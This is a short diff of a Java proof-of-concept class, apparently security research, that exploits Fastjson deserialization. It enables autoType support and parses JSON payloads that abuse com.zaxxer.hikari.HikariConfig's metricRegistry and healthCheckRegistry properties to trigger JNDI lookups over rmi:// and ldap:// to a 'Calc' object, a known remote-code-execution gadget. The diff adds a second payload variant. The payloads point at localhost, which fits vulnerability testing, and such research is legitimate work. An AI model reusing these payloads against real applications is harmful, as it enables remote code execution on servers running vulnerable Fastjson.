@@ -33,7 +33,9 @@ public class HikariConfigPoc {
     ParserConfig.global.setAutoTypeSupport(true);
 
 //    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://localhost:43657/Calc\"}";
+//    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"rmi://localhost:43657/Calc\"}";
     String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}";
+    String payload2 = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
     JSON.parse(payload);
   }
 }
